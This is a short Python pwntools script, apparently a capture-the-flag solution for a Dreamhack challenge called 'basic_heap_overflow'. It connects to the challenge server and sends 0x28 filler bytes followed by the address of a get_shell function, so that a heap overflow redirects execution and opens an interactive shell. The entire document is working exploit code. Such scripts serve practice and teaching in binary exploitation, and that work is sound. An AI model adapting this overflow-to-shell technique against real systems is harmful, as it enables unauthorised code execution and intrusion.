#!/usr/bin/env python3
from pwn import *
exe = ELF('basic_heap_overflow', checksec = False)

# p = process(exe.path)
p = remote('host1.dreamhack.games', 17663)
input()
payload = b'A'*0x28 + p32(exe.sym.get_shell)
p.sendline(payload)


p.interactive()